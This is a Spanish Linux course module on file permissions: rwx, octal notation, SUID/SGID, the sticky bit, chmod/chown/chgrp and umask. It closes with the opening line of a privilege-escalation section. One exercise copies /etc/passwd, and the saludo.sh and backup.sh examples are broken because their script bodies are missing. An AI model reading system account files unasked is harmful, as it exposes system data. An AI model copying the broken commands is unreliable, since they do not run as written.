---
title: "Módulo Permisos y Propietarios - Curso Linux Pentesting"
aliases:
  - Módulo Permisos y Propietarios - Curso Linux Pentesting
tags:
  - ifct0109/pocs
  - linux
  - permisos
  - suid
  - sgid
---

# Curso de Linux para Pentesting

Módulo: Permisos y Propietarios

  [[02 - MODULOS/Prácticas (PoCs)/Linux/01 - Curso de Linux para Pentesting|← Volver al Índice del Curso]]

## 🔐 Sistema de Permisos en Linux

Linux es un sistema **multiusuario**, donde múltiples personas pueden trabajar simultáneamente. El sistema de permisos controla **quién puede hacer qué** con cada archivo y directorio.

**Cada archivo/directorio tiene:**

* 👤 Un propietario (usuario dueño)

* 👥 Un grupo propietario

* 🔐 Permisos que definen qué pueden hacer el propietario, el grupo y otros

> [!warning] 🎓 Objetivo de esta sección
>        Aprenderás a:
>
>          Entender el sistema de permisos rwx (lectura, escritura, ejecución)
>          Leer permisos en notación simbólica y octal
>          Cambiar permisos con `chmod`
>          Cambiar propietario con `chown`
>          Cambiar grupo con `chgrp`
>          Aplicar permisos de forma práctica y segura

## 📊 Anatomía de los Permisos

#### Ver permisos de archivos

tecnico@linux:~$ ls -l
total 24
-rw-r--r-- 1 tecnico tecnico 1234 Feb  6 10:30 documento.txt
drwxr-xr-x 2 tecnico tecnico 4096 Feb  6 09:15 Descargas
-rwxr-xr-x 1 tecnico tecnico  156 Feb  5 14:20 script.sh
-rw------- 1 tecnico tecnico 2048 Feb  4 11:00 privado.txt

#### 🔍 Desglose de una línea

```bash
<strong>-rwxr-xr-x</strong> 1 <strong>tecnico</strong> <strong>tecnico</strong> 156 Feb 5 14:20 <strong>script.sh</strong>
││││││││││   │    │         │      │             │
││││││││││   │    │         │      │             └─ Nombre del archivo
││││││││││   │    │         │      └─ Fecha de modificación
││││││││││   │    │         └─ Tamaño (bytes)
││││││││││   │    └─ Grupo propietario
││││││││││   └─ Usuario propietario
││││││││││
│└┴┴┴┴┴┴┴┴─ Permisos (9 caracteres)
│
└─ Tipo: - (archivo regular), d (directorio), l (enlace simbólico)
```

### 🎯 Los 10 Caracteres de Permisos

```bash
<strong style="color: #e65100;">-</strong><strong style="color: #1976d2;"> rwx</strong><strong style="color: #388e3c;"> r-x</strong><strong style="color: #7b1fa2;"> r--</strong>
<strong style="color: #e65100;">│</strong> <strong style="color: #1976d2;">└┬┘</strong> <strong style="color: #388e3c;">└┬┘</strong> <strong style="color: #7b1fa2;">└┬┘</strong>
<strong style="color: #e65100;">│</strong>  <strong style="color: #1976d2;">│</strong>   <strong style="color: #388e3c;">│</strong>   <strong style="color: #7b1fa2;">└─ OTROS (others)</strong>
<strong style="color: #e65100;">│</strong>  <strong style="color: #1976d2;">│</strong>   <strong style="color: #388e3c;">└─ GRUPO (group)</strong>
<strong style="color: #e65100;">│</strong>  <strong style="color: #1976d2;">└─ PROPIETARIO (user/owner)</strong>
<strong style="color: #e65100;">└─ TIPO: - (archivo), d (directorio), l (link)</strong>
```

### 📖 Significado de r, w, x

| Permiso | Símbolo | En Archivos | En Directorios |
| --- | --- | --- | --- |
| Lectura | `r` | Ver el contenido del archivo | Listar archivos dentro (ls) |
| Escritura | `w` | Modificar o eliminar el archivo | Crear/eliminar archivos dentro |
| Ejecución | `x` | Ejecutar el archivo (si es un programa/script) | Entrar al directorio (cd) |
| Sin permiso | `-` | No puede realizar esa acción | No puede realizar esa acción |

### 💡 Ejemplos Comunes

| Permisos | Significado | Uso Típico |
| --- | --- | --- |
| `-rw-r--r--` | Propietario: lee y escribeGrupo: solo leeOtros: solo lee | Documentos normales, archivos de texto |
| `-rwxr-xr-x` | Propietario: lee, escribe y ejecutaGrupo: lee y ejecutaOtros: lee y ejecuta | Scripts ejecutables, programas |
| `-rw-------` | Propietario: lee y escribeGrupo: nadaOtros: nada | Archivos privados, claves SSH |
| `drwxr-xr-x` | Directorio accesible por todosPropietario puede modificar contenido | Directorios compartidos |
| `drwx------` | Directorio privadoSolo el propietario puede acceder | Directorios personales seguros |

## 🔢 Notación Octal (Numérica)

Además de la notación simbólica (rwx), los permisos se pueden expresar en **números octales** (base 8).

### 📊 Conversión rwx → Número

**Cada permiso tiene un valor:**

* `r` (lectura) = 4

* `w` (escritura) = 2

* `x` (ejecución) = 1

* `-` (sin permiso) = 0

**Se suman los valores para cada grupo (propietario, grupo, otros):**

```bash
<strong>rwx</strong>  =  4 + 2 + 1  =  <strong>7</strong>
<strong>rw-</strong>  =  4 + 2 + 0  =  <strong>6</strong>
<strong>r-x</strong>  =  4 + 0 + 1  =  <strong>5</strong>
<strong>r--</strong>  =  4 + 0 + 0  =  <strong>4</strong>
<strong>-wx</strong>  =  0 + 2 + 1  =  <strong>3</strong>
<strong>-w-</strong>  =  0 + 2 + 0  =  <strong>2</strong>
<strong>--x</strong>  =  0 + 0 + 1  =  <strong>1</strong>
<strong>---</strong>  =  0 + 0 + 0  =  <strong>0</strong>
```

### 🎯 Ejemplos Completos

| Simbólico | Octal | Cálculo | Significado |
| --- | --- | --- | --- |
| `-rwxr-xr-x` | 755 | 7(rwx) + 5(r-x) + 5(r-x) | Ejecutable común |
| `-rw-r--r--` | 644 | 6(rw-) + 4(r--) + 4(r--) | Archivo de texto normal |
| `-rw-------` | 600 | 6(rw-) + 0(---) + 0(---) | Archivo privado |
| `drwxr-xr-x` | 755 | 7(rwx) + 5(r-x) + 5(r-x) | Directorio compartido |
| `drwx------` | 700 | 7(rwx) + 0(---) + 0(---) | Directorio privado |
| `-rwxrwxrwx` | 777 | 7(rwx) + 7(rwx) + 7(rwx) | ⚠️ Todos tienen todos los permisos (inseguro) |

> [!warning] 🎯 Permisos Comunes y Sus Usos
>
>           755  - Scripts y programas ejecutables
>           644  - Documentos, archivos de texto, HTML
>           600  - Claves privadas SSH, archivos de configuración sensibles
>           700  - Directorios privados (.ssh, .gnupg)
>           666  - ⚠️ Archivo editable por todos (poco común, inseguro)
>           777  - ⚠️ ¡NUNCA usar! Totalmente inseguro

## 🔒 Permisos Especiales: SUID, SGID y Sticky Bit

Además de los permisos básicos (rwx), Linux tiene **tres permisos especiales** que modifican el comportamiento de archivos y directorios.

### ⚡ SUID (Set User ID) - 4000

#### ¿Qué es SUID?

Cuando un archivo tiene el bit SUID activado, se ejecuta con los permisos de su **propietario**, no con los permisos del usuario que lo ejecuta.

```bash
Sin SUID:   -rwxr-xr-x    (755)
Con SUID:   -rw<strong style="color: #f44336;">s</strong>r-xr-x    (4755)
                ↑
            's' en lugar de 'x' = SUID activo
```

**Notación Octal:** `4000` + permisos normales

* `4755` = SUID + rwxr-xr-x

* `4750` = SUID + rwxr-x---

* `4700` = SUID + rwx------

#### Ejemplo Práctico: /usr/bin/passwd

tecnico@linux:~$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 May 28 2024 /usr/bin/passwd
#   ↑ 's' indica SUID activo

# ¿Por qué passwd necesita SUID?
# Porque modifica /etc/shadow, que solo root puede escribir

tecnico@linux:~$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1234 Feb 6 10:00 /etc/shadow

# Cuando ejecutas passwd, temporalmente actúas como root
# para poder modificar tu contraseña en /etc/shadow

**Establecer SUID:**

# Método octal:
tecnico@linux:~$ chmod 4755 mi_programa
tecnico@linux:~$ ls -l mi_programa
-rwsr-xr-x 1 tecnico tecnico 1234 Feb 6 10:00 mi_programa

# Método simbólico:
tecnico@linux:~$ chmod u+s mi_programa

# Quitar SUID:
tecnico@linux:~$ chmod u-s mi_programa
# O: chmod 0755 mi_programa

> [!warning] ⚠️ IMPORTANTE - Seguridad de SUID
>
>            🔴  NUNCA  poner SUID en scripts de bash, python, perl
>            🔴 SUID en binarios de root es muy peligroso si tienen vulnerabilidades
>            🔴 Un binario SUID mal programado permite escalar a root
>            ✅ Solo usar SUID cuando sea estrictamente necesario

### 👥 SGID (Set Group ID) - 2000

#### ¿Qué es SGID?

Similar a SUID pero para grupos:

**En Archivos:** El archivo se ejecuta con los permisos del **grupo propietario**

**En Directorios:** Los archivos creados dentro heredan el grupo del directorio (no el grupo del usuario)

```bash
Sin SGID:   -rwxr-xr-x    (755)
Con SGID:   -rwxr-<strong style="color: #f44336;">s</strong>r-x    (2755)
                  ↑
              's' en grupo = SGID activo

Directorio: drwxrwsr-x    (2775)
                  ↑
              's' en grupo
```

**Notación Octal:** `2000` + permisos normales

* `2755` = SGID + rwxr-xr-x

* `2775` = SGID + rwxrwxr-x

* `2770` = SGID + rwxrwx---

#### Ejemplo Práctico: Directorio Compartido

**Escenario:** Crear un directorio donde todos los archivos pertenezcan al grupo "developers"

# 1. Crear directorio y establecer grupo:
tecnico@linux:~$ mkdir proyecto_compartido
tecnico@linux:~$ sudo chgrp developers proyecto_compartido

# 2. Activar SGID:
tecnico@linux:~$ chmod 2775 proyecto_compartido
tecnico@linux:~$ ls -ld proyecto_compartido
drwxrwsr-x 2 tecnico developers 4096 Feb 6 10:00 proyecto_compartido
#       ↑ 's' en grupo = SGID activo

# 3. Crear archivos dentro:
tecnico@linux:~$ touch proyecto_compartido/archivo1.txt
tecnico@linux:~$ ls -l proyecto_compartido/archivo1.txt
-rw-r--r-- 1 tecnico developers 0 Feb 6 10:05 archivo1.txt
# ¡Heredó el grupo "developers" del directorio!

# Sin SGID, el archivo habría tenido el grupo "tecnico"

**Establecer SGID:**

# Método octal:
tecnico@linux:~$ chmod 2775 directorio

# Método simbólico:
tecnico@linux:~$ chmod g+s directorio

# Quitar SGID:
tecnico@linux:~$ chmod g-s directorio

> [!warning] 💡 Uso Común de SGID
>           Directorios de trabajo colaborativo:  Cuando varios usuarios del mismo grupo necesitan compartir archivos y todos deben tener el mismo grupo propietario.

### 📌 Sticky Bit - 1000

#### ¿Qué es el Sticky Bit?

Se aplica a **directorios**. Cuando está activo, solo el propietario de un archivo (o root) puede eliminarlo, aunque el directorio tenga permisos de escritura para todos.

```bash
Sin Sticky: drwxrwxrwx    (777)
Con Sticky: drwxrwxrw<strong style="color: #f44336;">t</strong>    (1777)
                     ↑
                 't' = Sticky bit activo
```

**Notación Octal:** `1000` + permisos normales

* `1777` = Sticky + rwxrwxrwx

* `1775` = Sticky + rwxrwxr-x

#### Ejemplo Práctico: /tmp (Directorio Temporal)

tecnico@linux:~$ ls -ld /tmp
drwxrwxrwt 10 root root 4096 Feb 6 10:00 /tmp
#         ↑ 't' = Sticky bit activo

# Todos pueden crear archivos en /tmp:
tecnico@linux:~$ touch /tmp/mi_archivo.txt
tecnico@linux:~$ ls -l /tmp/mi_archivo.txt
-rw-r--r-- 1 tecnico tecnico 0 Feb 6 10:00 /tmp/mi_archivo.txt

# Otro usuario NO puede eliminar tu archivo:
juan@linux:~$ rm /tmp/mi_archivo.txt
rm: cannot remove '/tmp/mi_archivo.txt': Operation not permitted
# ¡Protegido por el sticky bit!

# Solo tú (o root) puedes eliminarlo:
tecnico@linux:~$ rm /tmp/mi_archivo.txt
# ✅ Funciona

**Establecer Sticky Bit:**

# Método octal:
tecnico@linux:~$ chmod 1777 directorio_compartido

# Método simbólico:
tecnico@linux:~$ chmod +t directorio_compartido

# Quitar Sticky Bit:
tecnico@linux:~$ chmod -t directorio_compartido

> [!warning] 💡 Uso Común del Sticky Bit
>           Directorios compartidos temporales:  Como `/tmp`, donde todos pueden crear archivos pero nadie puede borrar los archivos de otros.

### 📊 Resumen de Permisos Especiales

| Permiso | Octal | Símbolo | Efecto | Uso Común |
| --- | --- | --- | --- | --- |
| SUID | `4000` | `s` en propietario | Ejecuta como propietario del archivo | /usr/bin/passwd, sudo |
| SGID | `2000` | `s` en grupo | Archivos: ejecuta como grupoDirectorios: hereda grupo | Directorios colaborativos |
| Sticky Bit | `1000` | `t` en otros | Solo propietario puede eliminar archivos | /tmp, directorios públicos |

### 🔢 Combinaciones de Permisos Especiales

| Permisos | Octal | Significado |
| --- | --- | --- |
| `-rwsr-xr-x` | `4755` | SUID + permisos normales de ejecutable |
| `drwxrwsr-x` | `2775` | SGID en directorio colaborativo |
| `drwxrwxrwt` | `1777` | Sticky bit en directorio público como /tmp |
| `-rwsr-sr-x` | `6755` | SUID + SGID (raro, muy peligroso) |
| `drwxrwsrwt` | `3777` | SGID + Sticky (directorio colaborativo protegido) |

> [!warning] 🎯 Nota sobre 'S' y 'T' Mayúsculas
>        Si ves una  S o T mayúscula  en lugar de minúscula:
>
>          `-rwSr-xr-x` - SUID está activo pero  NO  hay permiso de ejecución (x)
>          `drwxrwxrwT` - Sticky bit activo pero  NO  hay permiso de ejecución
>          La mayúscula indica que falta el permiso 'x'
>          Es raro y generalmente un error de configuración

## ⚙️ Cambiar Permisos: chmod

#### Comando: `chmod` (Change Mode)

Cambia los permisos de archivos y directorios.

### 🔢 Método 1: Notación Octal (Absoluta)

**Sintaxis:** `chmod [permisos_octales] archivo`

# Dar permisos 644 (rw-r--r--):
tecnico@linux:~$ chmod 644 documento.txt
tecnico@linux:~$ ls -l documento.txt
-rw-r--r-- 1 tecnico tecnico 1234 Feb 6 10:30 documento.txt

# Dar permisos 755 (rwxr-xr-x) a un script:
tecnico@linux:~$ chmod 755 script.sh
tecnico@linux:~$ ls -l script.sh
-rwxr-xr-x 1 tecnico tecnico 156 Feb 5 14:20 script.sh

# Permisos privados 600 (rw-------):
tecnico@linux:~$ chmod 600 privado.txt
tecnico@linux:~$ ls -l privado.txt
-rw------- 1 tecnico tecnico 2048 Feb 4 11:00 privado.txt

### 🔤 Método 2: Notación Simbólica (Relativa)

**Formato:** `chmod [quien][operador][permisos] archivo`

**Quién:**

* `u` = user (propietario)

* `g` = group (grupo)

* `o` = others (otros)

* `a` = all (todos: u+g+o)

**Operador:**

* `+` = Añadir permiso

* `-` = Quitar permiso

* `=` = Establecer exactamente estos permisos

**Permisos:** `r`, `w`, `x`

**Ejemplos prácticos:**

# Añadir permiso de ejecución al propietario:
tecnico@linux:~$ chmod u+x script.sh
-rwxr--r-- 1 tecnico tecnico 156 Feb 5 14:20 script.sh

# Quitar permiso de escritura al grupo:
tecnico@linux:~$ chmod g-w archivo.txt
-rw-r--r-- 1 tecnico tecnico 100 Feb 6 10:00 archivo.txt

# Dar ejecución a todos:
tecnico@linux:~$ chmod a+x programa
-rwxr-xr-x 1 tecnico tecnico 5000 Feb 6 11:00 programa

# Quitar todos los permisos a otros:
tecnico@linux:~$ chmod o-rwx privado.txt
-rw-rw---- 1 tecnico tecnico 200 Feb 6 09:00 privado.txt

# Establecer permisos exactos para el grupo (lectura solamente):
tecnico@linux:~$ chmod g=r archivo.txt
-rw-r----- 1 tecnico tecnico 100 Feb 6 10:00 archivo.txt

# Combinaciones múltiples:
tecnico@linux:~$ chmod u+x,g+x,o-r script.sh
-rwxr-x--- 1 tecnico tecnico 156 Feb 5 14:20 script.sh

### 📁 Aplicar Recursivamente

**Opción `-R`:** Aplica permisos a un directorio y todo su contenido

# Dar permisos 755 a un directorio y todo lo que contiene:
tecnico@linux:~$ chmod -R 755 mi_proyecto/
# Todos los archivos y subdirectorios dentro tendrán 755

# Quitar permisos de ejecución a otros de forma recursiva:
tecnico@linux:~$ chmod -R o-x documentos/

> [!warning] ⚠️ Cuidado con -R:  Aplica el cambio a TODOS los archivos y directorios dentro. Úsalo con precaución.

## 👤 Cambiar Propietario: chown

#### Comando: `chown` (Change Owner)

Cambia el propietario (y opcionalmente el grupo) de archivos y directorios.

**Sintaxis:**

* `chown usuario archivo` - Cambiar solo el propietario

* `chown usuario:grupo archivo` - Cambiar propietario y grupo

* `chown :grupo archivo` - Cambiar solo el grupo

# Ver propietario actual:
tecnico@linux:~$ ls -l documento.txt
-rw-r--r-- 1 tecnico tecnico 1234 Feb 6 10:30 documento.txt

# Cambiar propietario a otro usuario (requiere sudo):
tecnico@linux:~$ sudo chown juan documento.txt
tecnico@linux:~$ ls -l documento.txt
-rw-r--r-- 1 juan tecnico 1234 Feb 6 10:30 documento.txt

# Cambiar propietario Y grupo:
tecnico@linux:~$ sudo chown juan:developers documento.txt
tecnico@linux:~$ ls -l documento.txt
-rw-r--r-- 1 juan developers 1234 Feb 6 10:30 documento.txt

# Cambiar solo el grupo (alternativa):
tecnico@linux:~$ sudo chown :www-data index.html
tecnico@linux:~$ ls -l index.html
-rw-r--r-- 1 tecnico www-data 500 Feb 6 11:00 index.html

**Cambiar recursivamente:**

# Cambiar propietario de un directorio y todo su contenido:
tecnico@linux:~$ sudo chown -R juan:developers proyecto/
# Todos los archivos dentro ahora pertenecen a juan:developers

> [!warning] ⚠️ Importante sobre chown
>
>            Solo  root  puede cambiar el propietario de archivos
>            Los usuarios normales solo pueden cambiar el grupo (si pertenecen a ese grupo)
>            `chown` requiere `sudo` en la mayoría de casos

## 👥 Cambiar Grupo: chgrp

#### Comando: `chgrp` (Change Group)

Cambia el grupo propietario de archivos y directorios.

**Sintaxis:** `chgrp grupo archivo`

# Ver grupo actual:
tecnico@linux:~$ ls -l proyecto.txt
-rw-r--r-- 1 tecnico tecnico 800 Feb 6 10:00 proyecto.txt

# Cambiar grupo (debes pertenecer al grupo):
tecnico@linux:~$ chgrp developers proyecto.txt
tecnico@linux:~$ ls -l proyecto.txt
-rw-r--r-- 1 tecnico developers 800 Feb 6 10:00 proyecto.txt

# Cambiar grupo recursivamente:
tecnico@linux:~$ chgrp -R www-data sitio_web/
# Todo el directorio y su contenido ahora pertenece al grupo www-data

> [!warning] 💡 chown vs chgrp:
>
>            `chown` puede cambiar propietario Y grupo a la vez
>            `chgrp` solo cambia el grupo (más específico)
>            Puedes usar cualquiera de los dos para cambiar grupos

## 🎯 Práctica Guiada: Trabajando con Permisos

### Ejercicio 1: Crear y Manipular un Archivo

# 1. Crear un archivo copiando /etc/passwd:
tecnico@linux:~$ cat /etc/passwd > mi_passwd.txt

# 2. Ver permisos iniciales:
tecnico@linux:~$ ls -l mi_passwd.txt
-rw-r--r-- 1 tecnico tecnico 2453 Feb 6 12:00 mi_passwd.txt
# Permisos: 644 (el propietario lee/escribe, grupo y otros solo leen)

# 3. Quitar permisos de lectura a grupo y otros:
tecnico@linux:~$ chmod 600 mi_passwd.txt
tecnico@linux:~$ ls -l mi_passwd.txt
-rw------- 1 tecnico tecnico 2453 Feb 6 12:00 mi_passwd.txt
# Ahora es privado (solo tú puedes leerlo/escribirlo)

# 4. Dar permisos de lectura al grupo:
tecnico@linux:~$ chmod g+r mi_passwd.txt
tecnico@linux:~$ ls -l mi_passwd.txt
-rw-r----- 1 tecnico tecnico 2453 Feb 6 12:00 mi_passwd.txt

# 5. Volver a permisos normales:
tecnico@linux:~$ chmod 644 mi_passwd.txt
tecnico@linux:~$ ls -l mi_passwd.txt
-rw-r--r-- 1 tecnico tecnico 2453 Feb 6 12:00 mi_passwd.txt

### Ejercicio 2: Crear y Ejecutar un Script

# 1. Crear un script simple:
tecnico@linux:~$ cat > saludo.sh # 2. Ver permisos iniciales (sin ejecución):
tecnico@linux:~$ ls -l saludo.sh
-rw-r--r-- 1 tecnico tecnico 68 Feb 6 12:05 saludo.sh

# 3. Intentar ejecutarlo (fallará):
tecnico@linux:~$ ./saludo.sh
bash: ./saludo.sh: Permission denied
# ❌ No tiene permiso de ejecución

# 4. Dar permiso de ejecución al propietario:
tecnico@linux:~$ chmod u+x saludo.sh
tecnico@linux:~$ ls -l saludo.sh
-rwxr--r-- 1 tecnico tecnico 68 Feb 6 12:05 saludo.sh

# 5. Ahora sí funciona:
tecnico@linux:~$ ./saludo.sh
¡Hola! Soy tecnico
Fecha actual: Thu Feb  6 12:05:30 CET 2025

# 6. Dar ejecución a todos (método octal):
tecnico@linux:~$ chmod 755 saludo.sh
tecnico@linux:~$ ls -l saludo.sh
-rwxr-xr-x 1 tecnico tecnico 68 Feb 6 12:05 saludo.sh
# Ahora cualquier usuario puede ejecutarlo

### Ejercicio 3: Trabajar con Directorios

# 1. Crear un directorio de trabajo:
tecnico@linux:~$ mkdir proyecto
tecnico@linux:~$ ls -ld proyecto
drwxr-xr-x 2 tecnico tecnico 4096 Feb 6 12:10 proyecto
# Permisos por defecto: 755

# 2. Crear algunos archivos dentro:
tecnico@linux:~$ touch proyecto/archivo1.txt proyecto/archivo2.txt

# 3. Hacer el directorio privado:
tecnico@linux:~$ chmod 700 proyecto
tecnico@linux:~$ ls -ld proyecto
drwx------ 2 tecnico tecnico 4096 Feb 6 12:10 proyecto
# Solo el propietario puede entrar y ver contenido

# 4. Cambiar permisos de todos los archivos dentro:
tecnico@linux:~$ chmod 644 proyecto/*
tecnico@linux:~$ ls -l proyecto/
-rw-r--r-- 1 tecnico tecnico 0 Feb 6 12:10 archivo1.txt
-rw-r--r-- 1 tecnico tecnico 0 Feb 6 12:10 archivo2.txt

# 5. Restaurar permisos normales del directorio:
tecnico@linux:~$ chmod 755 proyecto

### Ejercicio 4: Cambiar Propietario y Grupo

# 1. Ver propietarios actuales:
tecnico@linux:~$ ls -l mi_passwd.txt
-rw-r--r-- 1 tecnico tecnico 2453 Feb 6 12:00 mi_passwd.txt

# 2. Si perteneces a otros grupos, puedes cambiar el grupo del archivo:
tecnico@linux:~$ groups
tecnico sudo adm

tecnico@linux:~$ chgrp adm mi_passwd.txt
tecnico@linux:~$ ls -l mi_passwd.txt
-rw-r--r-- 1 tecnico adm 2453 Feb 6 12:00 mi_passwd.txt

# 3. Solo root puede cambiar el propietario:
tecnico@linux:~$ touch archivo_compartido.txt
tecnico@linux:~$ sudo chown root:root archivo_compartido.txt
tecnico@linux:~$ ls -l archivo_compartido.txt
-rw-r--r-- 1 root root 0 Feb 6 12:15 archivo_compartido.txt
# Ahora pertenece a root

# 4. Volver a ser propietario:
tecnico@linux:~$ sudo chown tecnico:tecnico archivo_compartido.txt

### Ejercicio 5: Crear un Script de Backup Simple

# 1. Crear un script de backup:
tecnico@linux:~$ cat > backup.sh /dev/null

echo "Backup creado: documentos_$FECHA.tar.gz"
EOF

# 2. Dar permisos de ejecución:
tecnico@linux:~$ chmod 755 backup.sh
tecnico@linux:~$ ls -l backup.sh
-rwxr-xr-x 1 tecnico tecnico 325 Feb 6 12:20 backup.sh

# 3. Ejecutar el script:
tecnico@linux:~$ ./backup.sh
Backup creado: documentos_20250206_122030.tar.gz

# 4. Verificar que se creó el backup:
tecnico@linux:~$ ls -lh ~/backups/
-rw-r--r-- 1 tecnico tecnico 15K Feb 6 12:20 documentos_20250206_122030.tar.gz

## 🎭 umask - Permisos por Defecto

#### ¿Qué es umask?

**umask** (user file-creation mode mask) define los **permisos por defecto** que tendrán los archivos y directorios cuando los crees.

No establece permisos directamente, sino que **RESTA permisos** de los máximos posibles:

* Archivos: Máximo teórico = 666 (rw-rw-rw-)

* Directorios: Máximo teórico = 777 (rwxrwxrwx)

* umask RESTA permisos de estos máximos

#### 🔍 Ver tu umask actual

# Ver umask en notación octal:
tecnico@linux:~$ umask
0022

# Ver umask en notación simbólica:
tecnico@linux:~$ umask -S
u=rwx,g=rx,o=rx

#### 📊 Cómo Funciona el Cálculo

**Fórmula:** Permisos finales = Permisos máximos - umask

```bash
<strong style="color: #4caf50;">Ejemplo con umask 0022:</strong>

<strong>ARCHIVOS:</strong>
  Máximo:     666  (rw-rw-rw-)
  umask:      022  (----w--w-)
              ---
  Resultado:  644  (rw-r--r--)
                    ↓
  Propietario: rw  (puede leer y escribir)
  Grupo:       r   (solo puede leer)
  Otros:       r   (solo puede leer)

<strong>DIRECTORIOS:</strong>
  Máximo:     777  (rwxrwxrwx)
  umask:      022  (----w--w-)
              ---
  Resultado:  755  (rwxr-xr-x)
                    ↓
  Propietario: rwx (puede entrar, listar, crear/borrar)
  Grupo:       r-x (puede entrar y listar)
  Otros:       r-x (puede entrar y listar)
```

### Ejemplos Prácticos de umask

# Ejemplo 1: umask por defecto (0022)
tecnico@linux:~$ umask
0022

tecnico@linux:~$ touch archivo1.txt
tecnico@linux:~$ mkdir directorio1
tecnico@linux:~$ ls -l
-rw-r--r-- 1 tecnico tecnico    0 Feb  8 10:00 archivo1.txt
drwxr-xr-x 2 tecnico tecnico 4096 Feb  8 10:00 directorio1

# Ejemplo 2: Cambiar umask a 0077 (más restrictivo)
tecnico@linux:~$ umask 0077
tecnico@linux:~$ umask
0077

tecnico@linux:~$ touch archivo2.txt
tecnico@linux:~$ mkdir directorio2
tecnico@linux:~$ ls -l
-rw------- 1 tecnico tecnico    0 Feb  8 10:01 archivo2.txt
drwx------ 2 tecnico tecnico 4096 Feb  8 10:01 directorio2
# Solo el propietario tiene permisos (privado total)

# Ejemplo 3: umask 0002 (grupo puede escribir)
tecnico@linux:~$ umask 0002
tecnico@linux:~$ touch archivo3.txt
tecnico@linux:~$ mkdir directorio3
tecnico@linux:~$ ls -l
-rw-rw-r-- 1 tecnico tecnico    0 Feb  8 10:02 archivo3.txt
drwxrwxr-x 2 tecnico tecnico 4096 Feb  8 10:02 directorio3
# Propietario y grupo pueden leer/escribir

# Restaurar umask por defecto:
tecnico@linux:~$ umask 0022

#### 📋 Tabla de umask Comunes

| umask | Archivos Resultantes | Directorios Resultantes | Uso Típico |
| --- | --- | --- | --- |
| `0022` | `644` (rw-r--r--) | `755` (rwxr-xr-x) | Por defecto en la mayoría de sistemas |
| `0002` | `664` (rw-rw-r--) | `775` (rwxrwxr-x) | Trabajo colaborativo (grupo puede escribir) |
| `0077` | `600` (rw-------) | `700` (rwx------) | Privacidad total (solo propietario) |
| `0027` | `640` (rw-r-----) | `750` (rwxr-x---) | Grupo puede leer, otros sin acceso |
| `0007` | `660` (rw-rw----) | `770` (rwxrwx---) | Propietario y grupo, otros sin acceso |
| `0000` | `666` (rw-rw-rw-) | `777` (rwxrwxrwx) | ⚠️ Inseguro - Todos pueden todo |

#### 🔧 Hacer Permanente el umask

Por defecto, `umask` solo afecta la sesión actual. Para hacerlo permanente:

# Editar tu archivo .bashrc (para bash):
tecnico@linux:~$ nano ~/.bashrc

# Añadir al final del archivo:
# Establecer umask por defecto
umask 0022

# Guardar (Ctrl+O, Enter, Ctrl+X)

# Recargar configuración:
tecnico@linux:~$ source ~/.bashrc

# Para cambiar umask de TODOS los usuarios (requiere root):
tecnico@linux:~$ sudo nano /etc/profile

# O en /etc/bash.bashrc (Debian/Ubuntu)

### 🧮 Calcular umask Manualmente

**Método rápido:** Resta lo que NO quieres que tengan del máximo

# Quiero que mis archivos sean rw-r----- (640)
# Archivos máximo: 666 (rw-rw-rw-)
# Lo que quiero:   640 (rw-r-----)
# umask necesaria: 666 - 640 = 026

tecnico@linux:~$ umask 0026
tecnico@linux:~$ touch test.txt
tecnico@linux:~$ ls -l test.txt
-rw-r----- 1 tecnico tecnico 0 Feb  8 10:15 test.txt
# ✅ Correcto

**Descomposición por posición:**

```bash
<strong>umask 0026 significa:</strong>

Propietario (u):  0  →  Máximo - 0  =  6 (rw-)
Grupo (g):        2  →  Máximo - 2  =  4 (r--)
Otros (o):        6  →  Máximo - 6  =  0 (---)

Valores de umask:
  0 = no resta nada     →  rwx (7) o rw (6)
  1 = resta ejecución   →  rw- (6) o r-- (4)
  2 = resta escritura   →  r-x (5) o r-- (4)
  3 = resta w+x         →  r-- (4) o r-- (4)
  4 = resta lectura     →  -wx (3) o -w- (2)
  5 = resta r+x         →  -w- (2) o --- (0)
  6 = resta r+w         →  --x (1) o --- (0)
  7 = resta todo        →  --- (0) o --- (0)
```

> [!warning] 💡 Puntos Importantes sobre umask
>
>          umask NO afecta archivos existentes, solo archivos nuevos
>          El primer 0 en `0022` es para permisos especiales (SUID/SGID/Sticky)
>          Cada usuario puede tener su propio umask en su `~/.bashrc`
>          El umask de root suele ser `0022` por defecto
>          Para directorios colaborativos, usa `0002` (grupo puede escribir)
>          Para máxima seguridad, usa `0077` (solo propietario)

### 🎯 Ejercicio Práctico: Experimentar con umask

# 1. Guardar umask actual:
tecnico@linux:~$ UMASK_ORIGINAL=$(umask)
tecnico@linux:~$ echo $UMASK_ORIGINAL
0022

# 2. Crear directorio de pruebas:
tecnico@linux:~$ mkdir test_umask && cd test_umask

# 3. Probar diferentes umask:
tecnico@linux:~/test_umask$ for mask in 0000 0022 0027 0077; do
  umask $mask
  touch "archivo_$mask.txt"
  mkdir "dir_$mask"
done

# 4. Ver resultados:
tecnico@linux:~/test_umask$ ls -l
-rw-rw-rw- 1 tecnico tecnico    0 Feb  8 10:20 archivo_0000.txt
-rw-r--r-- 1 tecnico tecnico    0 Feb  8 10:20 archivo_0022.txt
-rw-r----- 1 tecnico tecnico    0 Feb  8 10:20 archivo_0027.txt
-rw------- 1 tecnico tecnico    0 Feb  8 10:20 archivo_0077.txt
drwxrwxrwx 2 tecnico tecnico 4096 Feb  8 10:20 dir_0000
drwxr-xr-x 2 tecnico tecnico 4096 Feb  8 10:20 dir_0022
drwxr-x--- 2 tecnico tecnico 4096 Feb  8 10:20 dir_0027
drwx------ 2 tecnico tecnico 4096 Feb  8 10:20 dir_0077

# 5. Restaurar umask original:
tecnico@linux:~/test_umask$ umask $UMASK_ORIGINAL
tecnico@linux:~/test_umask$ umask
0022

# 6. Limpiar:
tecnico@linux:~/test_umask$ cd .. && rm -rf test_umask

> [!warning] 🎯 Recomendaciones de Seguridad
>
>           Sistemas de producción:  umask `0027` o `0077`
>           Desarrollo colaborativo:  umask `0002`
>           Escritorio personal:  umask `0022` (por defecto)
>           Servidores web:  Considerar `0027` con grupo www-data
>           Root:  Siempre usar `0022` o más restrictivo

## ⚔️ Aplicaciones en Pentesting y Hacking Ético

A continuación encontrarás vectores de escalada de privilegios relacionados con permisos mal configurados, SUID/SGID, capabilities y técnicas avanzadas.

💡 Haz clic en cada sección para expandir el contenido

## 🎯 Técnicas de Pentesting con Permisos

      📂 Archivos con Permisos Excesivos (World-Writable)

#### Vector de Ataque: Archivos Escribibles por Todos

Archivos con permisos `777`, `666` o escribibles por "others" son vulnerabilidades graves que permiten modificación no autorizada.

